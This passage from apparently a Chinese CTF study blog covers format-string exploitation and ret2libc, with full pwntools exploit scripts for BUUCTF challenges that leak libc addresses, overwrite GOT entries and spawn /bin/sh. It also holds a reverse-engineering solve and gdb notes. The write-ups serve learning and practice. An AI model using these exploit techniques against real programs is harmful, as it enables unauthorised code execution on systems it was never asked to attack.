的第一个参数（即格式化字符串），而程序没有进行过滤或限制，就可能造成以下问题： 123char input[100];fgets(input, sizeof(input), stdin);printf(input); // ⚠️ 危险！用户输入直接作为格式化字符串 此时，攻击者可以构造输入，如： %x %x %x %x %s 程序会尝试从栈中读取参数，但由于没有提供参数列表，printf() 会继续从栈中“猜测”数据。这可能导致： 泄露栈内存内容（如返回地址、canary、函数指针等） 写入内存（通过 %n 格式符） 虽然没有写任何参数，但还是会对应地解析参数，因为在格式化字符串中写了对应的解析方式，所以在后续的函数运行中会解析栈上的元 素。对于整型值和浮点值，这没有什么问题，不管栈上是什么数据都能够按照整型值和浮点值解析出来，而字符串形式就不一定能解析出来 了。如果是一个非法地址，比如NULL，那么在解析的时候就会报错， 因为这个地址按照字符串解析是无法解析出来的，程序就会崩溃。这就是格式化字符串漏洞的基本原理 利用leakmemory(泄露栈上内容) 用了 %100s 来防止缓冲区溢出，但并没有限制用户输入的格式符内容 。也就是说： 用户可以输入 %x、%s、%n 等格式符。 printf 会根据这些格式符从栈中“猜测”数据，从而造成信息泄露或任意地址写入。 leakmemory(泄露任意地址内存)这里的目标设立泄露isoc99_scanf函数（scanf编译之后是isoc99_scanf在内存中的地址）。 %k$s 这里的p是可以更换的，比如更换为s就可以解析栈上的数据为字符串。 k：表示要打印的参数距离目前格式化字符串参数的距离。 因为在没有给printf提供对应的字符，但它是一个可变参数函数 ，它会从栈上依次读取数据来填充格式化字符串中的 %p、%x、%s、%n 等指令。 但你并不知道你输入的字符串在栈上的具体位置，所以你需要： 找到你的输入字符串在栈上的偏移量，才能精准控制读写的内容。 所以偏移量就是4 所以构造payload &#x3D; p32(scanf_got) + “%4$s” 相当于print(p32(scanf_got) + “%4$s”) 所以前四个字节是输出的scanf的got表 🧠 关键区别：地址 vs 地址的内容 scanf_got GOT 表中scanf的地址（.got段中的一个位置） 0x804a008 就像书的目录页码 泄露的地址（leak_addr） 这个 GOT 表项中存储的值（即scanf的实际地址） 0xf7e01234 就像目录页码指向的那一页的内容 脚本1234567891011121314from pwn import *p = process(&quot;./leakmemory&quot;)elf = ELF(&quot;./leakmemory&quot;)#gdb.attach(p,&quot;b printf&quot;)scanf_got = elf.got[&quot;__isoc99_scanf&quot;]payload=p32(scanf_got)+b&quot;%4$s&quot;p.sendline(payload)leak_addr = u32(p.recv(8)[4:])scanf_addr = leak_addrlog.success(&quot;scanf_addr:&quot; + hex(scanf_addr))p.interactive() printf 执行流程： printf 会从栈上读取参数； 它看到 %4$s，会从第 4 个参数位置读取一个地址； 这个地址是 0x804a018（你写入的 GOT 地址）； 然后从 0x804a018 地址中读出一个指针（比如 0xf7e01234，即 scanf 的运行时地址）； %s 会从 0xf7e01234 开始读取字符串，直到遇到 \\0； 最终你接收到的数据中包含 0xf7e01234。 📌 总结 elf.got[&quot;scanf&quot;]和elf.got[&quot;__isoc99_scanf&quot;]一样吗？ 不一定，取决于编译器 为什么会有__isoc99_scanf？ GCC 编译器为了支持 C99 标准引入的 怎么确认用哪个？ 用readelf -r或objdump -TR查看 GOT 表 能不能替换？ 只有 GOT 表中存在对应符号时才能替换 如果写错了会怎样？ 报错：KeyError 函数调用完整过程🌟 阶段 0️⃣：在 vulnfunc 里（调用 printf 之前） 这是已经在 vulnfunc 里，且栈帧已经建立好了。 栈顶在 esp，栈低在高地址方向。 12345678910111213 ↑ 高地址──────────────────────────────| 参数n（可能是命令行参数） || 参数2 || 参数1 |──────────────────────────────| 返回地址 → main |──────────────────────────────| 上一个 ebp | ← ebp (vulnfunc 的 ebp)──────────────────────────────| vulnfunc 局部变量 || … | ← esp （在 vulnfunc 里） ↓ 低地址 当你刚进入 vulnfunc： ebp → 上一个 ebp ebp+4 → 返回地址（返回到 main） ebp-xx → vulnfunc 的局部变量 esp → 最低处，指向局部变量 🌟 阶段 1️⃣：调用 printf(format) 当 vulnfunc 调用： 12printf(format); 调用者把返回地址 &amp; 参数压入栈： 1234567891011121314 ↑ 高地址──────────────────────────────| 参数n（main 的参数） || … |──────────────────────────────| 返回地址 → main |──────────────────────────────| 上一个 ebp | ← ebp (vulnfunc)──────────────────────────────| vulnfunc 局部变量 |──────────────────────────────| 参数1=format | ← esp+4| 返回地址 → vulnfunc+下一条 | ← esp ↓ 此时 esp 指向 printf 的返回地址，再往上是 printf 的参数。 🌟 阶段 2️⃣：进入 printf 后 在 printf 开始执行后，它建立自己的栈帧： 1234567891011121314151617 ↑ 高地址──────────────────────────────| 参数n（main 的参数） || … |──────────────────────────────| 返回地址 → main |──────────────────────────────| 上一个 ebp | ← ebp (vulnfunc)──────────────────────────────| vulnfunc 局部变量 |──────────────────────────────| 参数1=format | ← ebp+8| 返回地址 → vulnfunc+下一条 | ← ebp+4| 上一个 ebp | ← ebp (printf)──────────────────────────────| printf 局部变量 | ← esp ↓ 这里： printf 把当前的 ebp 压栈 把 ebp 设置为 esp esp 再向下留出局部变量空间 scanf函数会把读取到的数放在栈上一个空间，然后%p会把它泄露出来 使用 scanf 读取一个字符串（最多 100 字节），存入 format 缓冲区； 然后直接将这个字符串作为参数传给 printf，即：printf(format); overwrite(覆盖任意地址内存) 所以这道题的重点是修改几个数的值 1）将a覆盖为0x10。 2）将b覆盖为2。 3）将c覆盖为0x12345678。 其中a是局部变量，b,c是全局变量 局部变量存储在栈上，全局变量存储在数据段中（分为已初始化rodata和未初始化bss两部分） 12345678910111213141516171819202122232425262728+---------------------+ &lt;--- 高内存地址| 命令行参数 &amp; 环境变量 |+---------------------+| 栈 (Stack) | &lt;-- 局部变量、函数参数、返回地址| || Function Call N || (局部变量, 返回地址等)|| Function Call 2 || (局部变量, 返回地址等)|| Function Call 1 || (局部变量, 返回地址等)|| ... || || 空闲 || |+---------------------+| 堆 (Heap) | &lt;-- 动态分配内存 (malloc/new)| || ... |+---------------------+| .bss 段 (未初始化数据) | &lt;-- 未初始化的全局变量和静态变量 (例如: b)+---------------------+| .data 段 (已初始化数据) | &lt;-- 已初始化的全局变量和静态变量 (例如: c)+---------------------+| .text 段 (代码) | &lt;-- 程序执行代码 (指令)+---------------------+| 保留区域 |+---------------------+ &lt;--- 低内存地址 a的处理（局部变量）首先，a是局部变量，局部变量是存储在栈上的，其地址会因为开启ASLR而变化，所以在函数中将a的地址打印出来了 脚本12345678from pwn import *p=process(&quot;./overwrite&quot;)a=int(p.recvuntil(&#x27;\\n&#x27;,drop=True),16)print(hex(a))payload=p32(a)+b&quot;%12c&quot;+b&quot;%8$n&quot;p.sendline(payload)m=p.recv()print(m) int和u32() 函数 int(..., 16) 接收到的是字符串形式的地址（如&quot;0xffa79dbc&quot;） 转换为整数地址 主动泄露地址 u32(...) 接收到的是原始 4 字节数据（如b&#39;\\xbc\\x9d\\xa7\\xff&#39;） 将小端序的 4 字节转为整数 调用泄露地址 🧩 p32(a_addr) 是怎么用的？ 构造的 p32(a_addr) 会被 printf 当作一个参数处理： 它被压入栈上； %8$n 会从第 8 个参数位置读取它； 这个地址就是写入的目标地址。 🧩 %12c 是怎么用的？（目标是16，a的地址占四个字节） %12c 输出 12 个字符（如空格）； %n 会把当前输出的字符总数写入指定地址； 所以 %12c 的作用是让 %n 写入 12； 它本身不写入内存，但会影响 %n 的值。 不能换成b’a’*12,这个不会影响%n的总数 工作原理： 当 printf(payload) 执行时，payload 字符串会被放到栈上。 printf 开始解析 payload。它会把 p32(a_addr) 视为一个普通的字符串（但它实际上是 v1 的地址）。 然后遇到 %12c，它输出 12 个字符。 接着遇到 %8$n。此时 printf 已经输出了 12 个字符。它会去栈上寻找第 8 个参数的地址。由于 p32(a_addr) 放在了 payload 的开头，并且其长度是 4 字节，它会正好落在栈上第 8 个参数的位置上（这个偏移量是经过调试确定的）。 printf 会将当前已输出的字符数 12 写入到 p32(a_addr) 所表示的地址，也就是局部变量 v1 的地址。 最终，v1 的值被修改为 12。 b的处理（全局小数） b,c的地址可以直接找到 脚本1234567891011121314from pwn import *p = process(&quot;./overwrite&quot;)elf = ELF(&quot;./overwrite&quot;)#gdb.attach(p,&quot;b printf&quot;)a=int(p.recvuntil(&quot;\\n&quot;,drop=True),16)print(hex(a))b=0x0804A028payload=b&#x27;aa&#x27;+b&#x27;%10$n&#x27;+b&#x27;b&#x27;+p32(b)p.sendline(payload)info=p.recvline()if b&quot;overwrite b for a small value&quot; in info: print(b&quot;Success\\n&quot;)p.interactive() 为什么不能按照覆盖 a 的方法？（因为%n，b的地址已经超过2了，所以b的地址只能在%_$n之后） 偏移量计算的差异： 在覆盖 a 的方法中，p32(a_addr) 放在了 payload 的最开头，并且 printf 发现这个开头在它的参数列表中是第 8 个。 但是，如果将 p32(b_addr) 也放在 payload 的开头并尝试用 %8$n 写入，可能会遇到问题： 地址值与格式符冲突：0x0804A028 这个地址本身如果被 printf 解析成格式化字符串的一部分，可能会包含 % 或其他特殊字符，导致 printf 崩溃或行为异常。例如，地址的某个字节可能被解释为 %s 或 %x 的一部分，导致 printf 试图读取无效的内存地址。 控制性问题：我们通常希望将要写入的地址放在格式字符串的末尾，这样它就不会被 printf 误认为是格式符的一部分来处理，而只是一个普通的 4 字节数据。 特性 覆盖 v1 (局部变量) 覆盖 b (全局变量) 目标类型 栈上的局部变量 数据段上的全局变量 地址来源 运行时泄露 (每次可能不同) 静态固定 (编译时确定) p32(addr) 位置 放在 payload 的开头 放在 payload 的末尾 %n 偏移 8$ (因为地址放在开头，且在第 8 个参数位置) 10$ (因为地址放在末尾，且在第 10 个参数位置) 主要考量 确保 p32(addr) 不被误解为格式符，且在正确偏移 避免 b_addr 字节被误解为格式符，更稳定地作为参数地址 好的，如果你确认这个 b 是必须的，那么它在 payload 中的存在，就意味着它在栈的布局和 printf 对参数的解析中起到了关键作用，通常是保证了 p32(b_addr) 的正确对齐，使其落在 %10$n 预期的参数位置。 让我们来详细分析，为什么多一个 b 反而可能成为“必须的”。 有 b 的详细分析 1payload = b&quot;aa&quot; + b&quot;%10$n&quot; + b&quot;b&quot; + p32(b_addr) 让我们计算每个部分的长度： b&quot;aa&quot;：2 字节 b&quot;%10$n&quot;：5 字节 b&quot;b&quot;：1 字节 p32(b_addr)：4 字节 (假设 b_addr 是 0x0804A028) 总字节数 &#x3D; 2 + 5 + 1 + 4 &#x3D; 12 字节,在这里，b是为了补足字节 c的处理（全局大数） 这是一个很大的数，考虑逐字节写入 这里想把c覆盖为0x12345678，而c的地址是0x0804A02C，所以基本目标是： 12340x0804A02C:\\x780x0804A02D:\\x560x0804A02E:\\x340x0804A02F:\\x12 脚本1234567891011121314from pwn import *p=process(&quot;./overwrite&quot;)a=int(p.recvuntil(&quot;\\n&quot;,drop=True),16)print(hex(a))c=0x0804A02Cpayload=fmtstr_payload(offset=8,writes=&#123;c:0x12345678&#125;)p.sendline(payload)info =p.recvline()if b&quot;overwrite c for a big value&quot; in info: print(b&quot;Success&quot;)p.interactive() fmtstr_payloadfmtstr_payload 是 pwntools 提供的一个自动化工具 ，用于构造格式化字符串漏洞（Format String Vulnerability）的 payload 。 它的作用是： 自动计算字符数并构造 payload，用于写入任意地址的值（如 GOT 表、变量、返回地址等） 🧪 fmtstr_payload 的使用方法 基本语法 12from pwn import *fmtstr_payload(offset, writes, numbwritten=0, write_size=&#x27;byte&#x27;) 参数说明 offset 格式化字符串偏移量（你的输入在第几个%p的位置） writes 一个字典，表示你要写入的地址和值，如&#123;addr1: value1, addr2: value2&#125; numbwritten 已经输出的字符数（默认为 0，可以忽略） write_size 写入大小，可选：&#39;byte&#39;、&#39;short&#39;、&#39;int&#39;（默认是&#39;byte&#39;） 🧩 示例 1：写入一个地址为 16 123456789101112from pwn import *elf = ELF(&quot;./vuln&quot;)offset = 8 # 偏移量addr = elf.symbols[&#x27;a&#x27;] # 假设你要写入变量 a 的地址# 构造 payload：写入 a = 16payload = fmtstr_payload(offset, &#123;addr: 16&#125;)p = process(&quot;./vuln&quot;)p.sendline(payload)p.interactive() 🧩 示例 2：写入多个地址（如 a=16, b=2, c=0x12345678） 12345678910111213141516171819from pwn import *elf = ELF(&quot;./vuln&quot;)offset = 8a_addr = elf.symbols[&#x27;a&#x27;]b_addr = elf.symbols[&#x27;b&#x27;]c_addr = elf.symbols[&#x27;c&#x27;]# 构造 payload：写入多个地址writes = &#123; a_addr: 16, b_addr: 2, c_addr: 0x12345678&#125;payload = fmtstr_payload(offset, writes, write_size=&#x27;int&#x27;)p = process(&quot;./vuln&quot;)p.sendline(payload)p.interactive() fmt_demo（格式化字符串的综合利用） 可以先泄露libc的基址，得到system函数的地址 再根据此把printf的got表存储的地址换为system函数的地址 之后输入参数“&#x2F;bin&#x2F;sh”,就可以实现 脚本12345678910111213141516171819202122from pwn import *from LibcSearcher import LibcSearcherp=process(&quot;./fmt_demo&quot;)elf=ELF(&quot;./fmt_demo&quot;)read_got=elf.got[&quot;read&quot;]payload=p32(read_got)+b&quot;%4$s&quot;p.send(payload.ljust(0x100,b&quot;\\x00&quot;))read=u32(p.recv(8)[4:])print(hex(read))libc=LibcSearcher(&quot;read&quot;,read)libc_base=read-libc.dump(&quot;read&quot;)system=libc_base+libc.dump(&quot;system&quot;)payload=fmtstr_payload(offset=4,writes=&#123;elf.got[&quot;printf&quot;]:system&#125;)p.sendline(payload.ljust(0x100,b&quot;\\x00&quot;))bin=b&quot;/bin/sh&quot;p.sendline(bin.ljust(0x100,b&quot;\\x00&quot;))p.interactive() 那为什么还要填补 payload 的长度为 0x100 字节？” 我们来从 “payload 被复制到栈上” 这个现象出发，解释为什么我们有意地 将 payload 填充到固定长度（如 0x100 字节），尽管它可能会被复制到栈上。 ✅ 简短回答： 我们填补 payload 到固定长度（如 0x100 字节），是为了让 payload 被完整复制到栈上，从而让偏移固定、布局可控，便于利用格式化字符串漏洞进行地址泄露或写入操作。 📌 payload 的两种“命运”： 1️⃣ payload 短 &lt; 一些参数长度 printf从栈上读取参数 payload 在 buf 中，参数在栈上 2️⃣ payload 长 &gt; 一定长度（如 100 字节） printf把 payload 复制到栈上 payload 本身就在栈上 🧩 为什么要“故意”让 payload 被复制到栈上？ ✅ 优点一：偏移固定，便于调试 payload 被复制到栈上后，它在栈上的位置是固定的。 我们可以精准控制偏移（比如 %4$s 就一定读取 payload 中的地址）。 避免了因 payload 长度不同导致偏移变化的问题。 ✅ 优点二：便于构造写入操作（如 %n） 当我们想用 %n 写某个地址时，需要确保地址在栈上，且偏移固定。 如果 payload 被复制到栈上，我们就可以把地址放在 payload 开头，然后用 %1$n 精准写入。 ✅ 优点三：防止 payload 被截断或偏移漂移 如果 payload 长度不固定，可能导致偏移变化，%s、%n 读写错误地址。 填充到固定长度（如 0x100）可以避免这种漂移。 :grey_question:但我其实不太理解","categories":[],"tags":[{"name":"pwn_study","slug":"pwn-study","permalink":"http://example.com/tags/pwn-study/"},{"name":"格式化字符串","slug":"格式化字符串","permalink":"http://example.com/tags/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2/"}]},{"title":"ret2libc-printf","slug":"HarekazeCTF2019-baby-rop2","date":"2025-07-20T06:53:58.000Z","updated":"2025-07-20T09:27:47.719Z","comments":true,"path":"2025/07/20/HarekazeCTF2019-baby-rop2/","permalink":"http://example.com/2025/07/20/HarekazeCTF2019-baby-rop2/","excerpt":"","text":"严格符合printf的格式[HarekazeCTF2019]baby_rop2 而且函数中没有system函数和相应字符串 要泄露libc的地址 通过read读取数据，用printf打印出来 printf 函数的 GOT 地址不能用来泄露 printf 自己的地址？ 是的，这是个鸡生蛋蛋生鸡 的问题： printf@got 保存的是 printf 的真实地址（libc 中的地址）。 但你要调用 printf 才能打印它，而调用 printf 又依赖 GOT 表项的地址。 如果 GOT 表项还没解析（延迟绑定），它指向 PLT stub，不是真实地址。 即使 GOT 表项已解析，你也无法通过 printf(&quot;%s&quot;, printf_got) 正确读取地址。 🧠 总结对比 puts(puts_got) ✅ 可行 puts会尝试打印从puts_got开始的内容，libc 中有字符串，不会崩溃 printf(&quot;%s&quot;, printf_got) ❌ 不可行 printf会尝试从printf_got地址读取字符串，但那是个函数地址，不是字符串 printf(&quot;%p&quot;, printf_got) ✅ 可行（需构造） 可以打印地址，但需要正确设置格式字符串 printf(&quot;%s&quot;, read_got) ✅ 可行（偶尔） read_got指向的地址附近可能有字符串，可以打印出来 puts(printf_got) ✅ 可行（偶尔） 同上，但依赖 libc 中的字符串 要调用printf函数进行泄露，就要根据其特性来传参，printf函数有两个参数，一个格式化字符串，一个可变参数列表 RDI、RSI、RDX、RCX、R8、R9参数按照这个顺序传入寄存器中 有单独的rdi 所以rdi&#x3D;0x400733 但没有单独对rsi的处理 所以rsi_r15&#x3D;0x400731，对r15随便传入一个数就可 第一次payload的构造 12345678910payload = b&#x27;a&#x27;*0x28+p64(pop_rdi)+p64(format_str)payload+=p64(pop_rsi_r15)+p64(read_got)+p64(0)payload+=p64(printf_plt)+p64(main_plt)p.recvuntil(b&quot;name? &quot;)p.sendline(payload)read= u64(p.recvuntil(b&quot;\\x7f&quot;)[-6:] + b&#x27;\\0\\0&#x27;)print(hex(read)) 第二次通过计算出libc的基址，加上偏移量就得到了需要的函数的地址，就可与i进行构造了 1payload = b&#x27;a&#x27;*0x28+p64(pop_rdi)+p64(bin_sh)+p64(sys_addr) 脚本 123456789101112131415161718192021222324252627282930313233343536from pwn import *from LibcSearcher import *context.log_level = &#x27;debug&#x27;#p = process(&#x27;./babyrop2&#x27;)p = remote(&quot;node5.buuoj.cn&quot;,25235)elf = ELF(&#x27;./babyrop2&#x27;)pop_rdi = 0x0000000000400733pop_rsi_r15 = 0x0000000000400731 format_str = 0x0000000000400770 ret_addr = 0x0000000000400734printf_plt = elf.plt[&#x27;printf&#x27;]read_got = elf.got[&#x27;read&#x27;]main_plt = 0x400636payload = b&#x27;a&#x27;*0x28+p64(pop_rdi)+p64(format_str)payload+=p64(pop_rsi_r15)+p64(read_got)+p64(0)payload+=p64(printf_plt)+p64(main_plt)p.recvuntil(b&quot;name? &quot;)p.sendline(payload)read= u64(p.recvuntil(b&quot;\\x7f&quot;)[-6:] + b&#x27;\\0\\0&#x27;)print(hex(read))libc = LibcSearcher(&#x27;read&#x27;, read)libc_base = read - libc.dump(&#x27;read&#x27;)sys_addr = libc_base + libc.dump(&#x27;system&#x27;)bin_sh = libc_base + libc.dump(&#x27;str_bin_sh&#x27;)payload = b&#x27;a&#x27;*0x28+p64(pop_rdi)+p64(bin_sh)+p64(sys_addr)p.sendline(payload)p.interactive() 单个函数pwn2_sctf_2016 首先看到题目输入一个小于32的数，并把这个数当作get输入的最大限制 所以可以输入一个负数来解决这个限制 也是没有system函数的相关内容 考虑泄露libc的地址 :detective:用printf打印，可以用printf的got表、 因为你调用了 printf(printf_got)。 对于 printf 来说： 它看不到这是一个整数地址 它只是把你给的指针当作一个字符串格式解析 如果你传入的这个地址是可读的内存，它就会按照那块内存的内容当作字符串去输出 所以如果只是传一个参数，printf函数会刚好把它当作字符串 刚好解决了传递它本身的got表地址，和只有一个参数的问题 1payload=b&#x27;a&#x27; * (0x2c+4) + p32(printf_plt) + p32(main) + p32(printf_got) 之后就是标准流程 就是记得返回地址是main函数 要再次输入依次那个负数 脚本 123456789101112131415161718192021222324252627282930from pwn import *from LibcSearcher import *from time import sleepr = remote(&quot;node5.buuoj.cn&quot;,28640)elf = ELF(&#x27;./pwn2_sctf_2016&#x27;)printf_plt = elf.plt[&#x27;printf&#x27;]printf_got = elf.got[&#x27;printf&#x27;]main= elf.sym[&#x27;main&#x27;]r.recvuntil(b&#x27;read?&#x27;)r.sendline(b&#x27;-1&#x27;)r.recvuntil(b&quot;data!\\n&quot;)payload = b&#x27;a&#x27; * (0x2c+4)payload += p32(printf_plt) + p32(main) + p32(printf_got)r.sendline(payload)r.recvuntil(&#x27;\\n&#x27;)printf_addr=u32(r.recv(4))#接受libc = LibcSearcher(&#x27;printf&#x27;,printf_addr)base = printf_addr - libc.dump(&#x27;printf&#x27;)system_addr = base + libc.dump(&#x27;system&#x27;)bin_sh = base + libc.dump(&#x27;str_bin_sh&#x27;)r.recvuntil(b&#x27;How many bytes do you want me to read?&#x27;)r.sendline(b&#x27;-1&#x27;)r.recvuntil(b&quot;data!\\n&quot;)payload = b&#x27;a&#x27; * (0x2c+4) + p32(system_addr) + p32(main) + p32(bin_sh)r.sendline(payload)r.interactive()","categories":[],"tags":[{"name":"PWN","slug":"PWN","permalink":"http://example.com/tags/PWN/"},{"name":"BUU","slug":"BUU","permalink":"http://example.com/tags/BUU/"},{"name":"ret2libc_printf","slug":"ret2libc-printf","permalink":"http://example.com/tags/ret2libc-printf/"}]},{"title":"bjdctf_2020_babystack2","slug":"bjdctf-2020-babystack2","date":"2025-07-18T09:18:45.000Z","updated":"2025-07-18T09:30:00.120Z","comments":true,"path":"2025/07/18/bjdctf-2020-babystack2/","permalink":"http://example.com/2025/07/18/bjdctf-2020-babystack2/","excerpt":"","text":"只有nx保护 read是栈溢出漏洞 且函数中存在后门函数 分析主函数 输入长度nbytes（要求小于10） 但是观察到后面的read函数最多读取nbytesg个字节到buf中 10个字节无法实现栈溢出覆盖返回地址 又观察到 (unsigned int)nbytes是无符号整数，所以用负数会转化为无穷大的值 脚本 1234567891011from pwn import *#p=process(&quot;./bjdctf_2020_babystack2&quot;)#gdb.attach(p,&quot;b*0x400826&quot;)p=remote(&quot;node5.buuoj.cn&quot;,28556)p.recvuntil(b&quot;name:\\n&quot;)p.sendline(str(-1))p.recvuntil(b&quot;name?\\n&quot;)exit=0x6010b8payload=b&#x27;a&#x27;*(0x10+8)+p64(0x400726)p.sendline(payload)p.interactive()","categories":[],"tags":[{"name":"PWN","slug":"PWN","permalink":"http://example.com/tags/PWN/"},{"name":"BUU","slug":"BUU","permalink":"http://example.com/tags/BUU/"},{"name":"栈溢出","slug":"栈溢出","permalink":"http://example.com/tags/%E6%A0%88%E6%BA%A2%E5%87%BA/"}]},{"title":"Youngter-drive","slug":"Youngter-drive","date":"2025-07-17T12:30:33.000Z","updated":"2025-07-25T09:21:20.902Z","comments":true,"path":"2025/07/17/Youngter-drive/","permalink":"http://example.com/2025/07/17/Youngter-drive/","excerpt":"","text":"可以看出是一个多线程 线程分析1::hObject = CreateMutexW(0, 0, 0); 目的： 创建一个 Mutex（互斥锁），线程之间访问共享资源时用它来保护数据。 两个线程都会读写全局变量，比如 Dest（flag 存放的地方）、len。 如果两个线程同时写入&#x2F;读写，会造成数据错乱，所以需要互斥锁来同步。 当一个线程拿到 Mutex 后，另一个线程必须等它释放 Mutex 才能进入关键区。 12hObject = CreateThread(0, 0, StartAddress, 0, 0, 0);Thread = CreateThread(0, 0, sub_41119F, 0, 0, 0); 创建线程，第三个参数是改线程要执行的函数的函数入口 12CloseHandle(hObject);CloseHandle(Thread); 关闭线程句柄（只是释放句柄资源） 线程本身依然在后台运行，等它们的函数返回时，线程自然结束。 （注意：这里关闭的是句柄，不是线程本身） 1CloseHandle(::hObject); 释放资源 结束 主线程 像 导演，负责协调整个流程： 让用户输入 flag（sub_4110FF）。 创建两个“工人”（线程1和线程2）： 工人1（加密线程）：对 flag 进行加密。 工人2（轮数控制线程）：控制加密的轮数。 导演等待工人完成任务（while (len != -1)）。 工人完成后，导演输出结果（sub_411190）。 函数分析StartAddress 可以看到每次执行时len会减1 打开后可以看到是一个加密操作 a1时我们输入的flag,a2待会儿分析得到他是29 分析得到 倒着，从flag的最后一位开始，分为两种加密，为小写字符和非小写字母时 sub_41119F 只减少len,不改变字符 len数值 看着后面的标注可以看到0x1D是29，刚好等于后面的标注TOiZiZtOrYaToUwPnToBsOaOapsyS的长度 可以猜想这个len相当于密文的下标 且加密后的数值是 flag有30位 脚本思路，把TOiZiZtOrYaToUwPnToBsOaOapsyS逆回去 不知道是技奇数位还是偶数位，i %2 &#x3D;&#x3D; 1也尝试一下 脚本 123456789101112131415161718192021off_418000 = &quot;QWERTYUIOPASDFGHJKLZXCVBNMqwertyuiopasdfghjklzxcvbnm&quot;off_418004 = &quot;TOiZiZtOrYaToUwPnToBsOaOapsyS&quot;print(len(off_418004))flag=&#x27;&#x27;for i in range(len(off_418004)): if i %2 == 0: flag += off_418004[i] continue for j,k in enumerate(off_418000): if off_418004[i] == k: if chr(j+38).isupper(): flag += chr(j+38) else: flag += chr(j+96)print(flag)print(chr(off_418000[29]))#ThisisthreadofwindowshahaIsES 输出了29个字符 而对字符串的操作是操作了30位的（0到29），所以最后一位可能需要我们猜测，把每个字母都 猜一遍（可以用代码写，用字符串拼接函数） 最终flag： 1flag&#123;ThisisthreadofwindowshahaIsESE&#125;","categories":[],"tags":[{"name":"RE","slug":"RE","permalink":"http://example.com/tags/RE/"},{"name":"BUU","slug":"BUU","permalink":"http://example.com/tags/BUU/"},{"name":"推测","slug":"推测","permalink":"http://example.com/tags/%E6%8E%A8%E6%B5%8B/"}]},{"title":"gdb调试","slug":"控制命令","date":"2025-07-16T03:04:42.000Z","updated":"2025-07-17T11:58:00.123Z","comments":true,"path":"2025/07/16/控制命令/","permalink":"http://example.com/2025/07/16/%E6%8E%A7%E5%88%B6%E5%91%BD%E4%BB%A4/","excerpt":"","text":"TAB：显示所有命令 start:运行到程序入口处 run:运行完整个程序 🔍 x 命令的基本语法：x&#x2F;nfs address n ：要显示的内存单元个数（默认是 1）。 f ：显示格式（format），比如十六进制、十进制、字符串等。 s ：内存单元大小（size），比如字节、半字、字等。 address ：要查看的内存地址（可以是变量名、寄存器、指针表达式等）。 f：输出格式（format） x Hex（十六进制） d Decimal（十进制） u Unsigned decimal o Octal（八进制） t Binary（二进制） f Floating point（浮点数） a Address（地址，显示指针） i Instruction（反汇编指令） c Char（字符） s String（字符串） s：内存单元大小（size） b byte（字节） 1 字节 h halfword（半字） 2 字节 w word（字） 4 字节 g giant word（双字） 8 字节 🧠 示例用法 1.查看地址 0x7fffffffe000 处的 4 个 4 字节数值，以十六进制显示： 1x/4wx 0x7fffffffe000 输出 10x7fffffffe000: 0x00000001 0x00007fff 0x00000000 0x00000000 2. 查看地址 0x400500 处的 5 条汇编指令： 1x/5i 0x400500 输出 123450x400500: push %rbp0x400501: mov %rsp,%rbp0x400504: sub $0x10,%rsp0x400508: mov %edi,-0x4(%rbp)0x40050b: mov %rsi,-0x10(%rbp) 3. 查看栈顶指针 rsp 地址的内容（以 8 字节为单位，显示为十六进制）： 1x/gx $rsp 输出 1x/gx $rsp 4. 查看地址 0x7fffffffe010 开始的字符串： 1x/s 0x7fffffffe010 输出 10x7fffffffe010: &quot;Hello, world!&quot; 5.查看地址 0x601038 的 10 个字节，以十进制形式显示： 1x/10db 0x601038 输出 10x601038: 72 101 108 108 111 44 32 119 111 114 :small_airplane:接收数据 函数 说明 recvall() 接收所有数据直到 EOF recvline() 接收一行（以\\n结尾） recvuntil(delim) 接收数据直到遇到指定分隔符（如&quot;Welcome!&quot;） recvregex(regex) 接收数据直到匹配正则表达式 recv(n) 接收指定字节数的数据（阻塞直到收到 n 字节）","categories":[],"tags":[{"name":"pwn_study","slug":"pwn-study","permalink":"http://example.com/tags/pwn-study/"}]},{"title":"御网杯线下2025","slug":"御网杯2025线下","date":"2025-07-14T13:48:44.000Z","updated":"2025-07-20T10:10:43.524Z","comments":true,"path":"2025/07/14/御网杯2025线下/","permalink":"http://example.com/2025/07/14/%E5%BE%A1%E7%BD%91%E6%9D%AF2025%E7%BA%BF%E4%B8%8B/","excerpt":"","text":"re_c FLAG:flag{HNCTFmng1} re_python 得到 脚本 12345678910c = [144, 163, 158, 177, 121, 39, 58, 58, 91, 111, 25, 158, 72, 53, 152, 78, 171, 12, 53, 105, 45, 12, 12, 53, 12, 171, 111, 91, 53, 152, 105, 45, 152, 144, 39, 171, 45, 91, 78, 45, 158, 8]flag=&quot;&quot;for i in range(42): for j in range (128): if j * 33 % 179 == c[i]: flag+=chr(j)print(flag)#flag&#123;2889e7a3-0d6b-4cbb-b6e9-04c0f26c9dca&#125; 再替换一下 crypto1 放到随波逐流里面能看到Rot13解码之后是明显的16进制编码形式 经过16进制转字符后特征很明显，最后Base32-&gt;Base64-&gt;Ascii85混合解码得到flag。 Crypto_10看到题目描述重排时序 62星序猜测倒序和Base62。 倒序： Base62解码： crypto解压这个文件夹打开下载的附件，有一个压缩包和一张图片。直接解压文件夹需要密码，图片也不能直接打开。 图片用010打开发现文件头是错的修改一下，得到解压密码。 压缩包解压得到flag.jpg直接放随波逐流里然后base64解码。 得到ctf_you_passed包裹flag{}就是最后的flag。 crypto encryption21234567891011121314151617181920212223242526272829303132333435from secret import init1,init2,init3,FLAGimport hashlibassert(FLAG==&quot;flag&#123;&quot;+hashlib.sha256(init1+init2+init3).hexdigest()+&quot;&#125;&quot;)classlfsr(): def__init__(self, init, mask, length): self.init = init self.mask = mask self.lengthmask = 2**(length+1)-1 defnext(self): nextdata = (self.init &lt;&lt; 1) &amp; self.lengthmask i = self.init &amp; self.mask &amp; self.lengthmask output = 0 while i != 0: output ^= (i &amp; 1) i = i &gt;&gt; 1 nextdata ^= output self.init = nextdata return outputdefcombine(x1,x2,x3): return (x1*x2)^(x2*x3)^(x1*x3)if __name__==&quot;__main__&quot;: l1 = lfsr(int.from_bytes(init1,&quot;big&quot;),0b100000000000000000000000010000000000000000000000,48) l2 = lfsr(int.from_bytes(init2,&quot;big&quot;),0b100000000000000000000000000000000010000000000000,48) l3 = lfsr(int.from_bytes(init3,&quot;big&quot;),0b100000100000000000000000000000000000000000000000,48) withopen(&quot;keystream&quot;,&quot;wb&quot;) as f: for i inrange(8192): b = 0 for j inrange(8): b = (b&lt;&lt;1)+combine(l1.next(),l2.next(),l3.next()) f.write(chr(b).encode()) Misc1题目附件是一个加密的压缩包，直接爆破。 打开文档全选复制 粘贴一下就能看到flag Misc2 键盘流量 Misc3 